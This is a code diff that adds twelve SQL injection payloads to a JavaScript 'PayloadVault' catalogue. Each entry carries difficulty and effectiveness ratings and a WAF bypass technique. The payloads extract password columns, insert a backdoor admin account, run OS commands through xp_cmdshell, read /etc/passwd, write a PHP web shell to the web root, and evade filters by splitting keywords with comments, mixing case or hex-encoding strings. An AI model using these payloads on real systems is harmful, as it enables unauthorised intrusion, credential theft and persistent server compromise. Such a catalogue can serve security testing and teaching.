@@ -730,6 +730,138 @@ const PayloadVault = () => {
       description: "Extracts data character by character using boolean conditions.",
       bypassTechnique: "Boolean inference"
     },
+    {
+      id: 304,
+      name: "Error-based SQLi (MySQL)",
+      category: "SQL Injection",
+      difficulty: "Intermediate",
+      code: "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT password FROM users LIMIT 1)))--",
+      effectiveness: 5,
+      target: "PHP",
+      description: "Forces MySQL error message to reveal data using EXTRACTVALUE function.",
+      bypassTechnique: "Error message exploitation"
+    },
+    {
+      id: 305,
+      name: "Stacked Queries - Admin Insert",
+      category: "SQL Injection",
+      difficulty: "Advanced",
+      code: "'; INSERT INTO users(username,password,role) VALUES('hacker','pass123','admin');--",
+      effectiveness: 5,
+      target: "PHP",
+      description: "Creates backdoor admin account using stacked query execution.",
+      bypassTechnique: "Query stacking"
+    },
+    {
+      id: 306,
+      name: "MSSQL xp_cmdshell",
+      category: "SQL Injection",
+      difficulty: "Advanced",
+      code: "'; EXEC xp_cmdshell 'whoami';--",
+      effectiveness: 5,
+      target: "ASP.NET",
+      description: "Executes OS commands on SQL Server via xp_cmdshell stored procedure.",
+      bypassTechnique: "Command execution"
+    },
+    {
+      id: 307,
+      name: "PostgreSQL File Read",
+      category: "SQL Injection",
+      difficulty: "Advanced",
+      code: "' UNION SELECT NULL, pg_read_file('/etc/passwd'), NULL--",
+      effectiveness: 4,
+      target: "Python",
+      description: "Reads server files using PostgreSQL pg_read_file function.",
+      bypassTechnique: "File system access"
+    },
+    {
+      id: 308,
+      name: "MySQL INTO OUTFILE",
+      category: "SQL Injection",
+      difficulty: "Advanced",
+      code: "' UNION SELECT '<?php system($_GET[\"c\"]); ?>' INTO OUTFILE '/var/www/shell.php'--",
+      effectiveness: 5,
+      target: "PHP",
+      description: "Writes web shell to server using MySQL file write capability.",
+      bypassTechnique: "File write"
+    },
+    {
+      id: 309,
+      name: "Second-Order SQLi",
+      category: "SQL Injection",
+      difficulty: "Advanced",
+      code: "admin'--",
+      effectiveness: 4,
+      target: "PHP",
+      description: "Stored payload that executes when retrieved later in different context.",
+      bypassTechnique: "Delayed execution"
+    },
+    {
+      id: 310,
+      name: "WAF Bypass - Comment Inline",
+      category: "SQL Injection",
+      difficulty: "Intermediate",
+      code: "' UN/**/ION SEL/**/ECT password FR/**/OM users--",
+      effectiveness: 4,
+      target: "PHP",
+      description: "Bypasses WAF keyword detection using inline SQL comments.",
+      bypassTechnique: "Comment obfuscation"
+    },
+    {
+      id: 311,
+      name: "WAF Bypass - Case Variation",
+      category: "SQL Injection",
+      difficulty: "Beginner",
+      code: "' uNiOn SeLeCt password FrOm users--",
+      effectiveness: 3,
+      target: "PHP",
+      description: "Evades case-sensitive WAF rules using mixed case keywords.",
+      bypassTechnique: "Case manipulation"
+    },
+    {
+      id: 312,
+      name: "Oracle ROWNUM Extraction",
+      category: "SQL Injection",
+      difficulty: "Intermediate",
+      code: "' UNION SELECT NULL, username, password FROM (SELECT ROWNUM r, username, password FROM users) WHERE r=1--",
+      effectiveness: 4,
+      target: "Java",
+      description: "Oracle-specific data extraction using ROWNUM for pagination bypass.",
+      bypassTechnique: "Oracle syntax"
+    },
+    {
+      id: 313,
+      name: "GROUP_CONCAT Dump",
+      category: "SQL Injection",
+      difficulty: "Intermediate",
+      code: "' UNION SELECT NULL, GROUP_CONCAT(username,':',password), NULL FROM users--",
+      effectiveness: 5,
+      target: "PHP",
+      description: "Extracts all rows in single query using MySQL GROUP_CONCAT function.",
+      bypassTechnique: "Aggregation abuse"
+    },
+    {
+      id: 314,
+      name: "Hex Encoding Bypass",
+      category: "SQL Injection",
+      difficulty: "Intermediate",
+      code: "' UNION SELECT 0x61646d696e, password FROM users--",
+      effectiveness: 4,
+      target: "PHP",
+      description: "Uses hex encoding to bypass string filtering and WAF rules.",
+      bypassTechnique: "Hex encoding"
+    },
+    {
+      id: 315,
+      name: "Subquery Data Extraction",
+      category: "SQL Injection",
+      difficulty: "Intermediate",
+      code: "' AND (SELECT password FROM users WHERE username='admin')='test",
+      effectiveness: 4,
+      target: "PHP",
+      description: "Uses subquery in WHERE clause to test for specific values.",
+      bypassTechnique: "Subquery injection"
+    },
 
     // CRLF Injection Payloads - UPDATED AND EXPANDED
     {
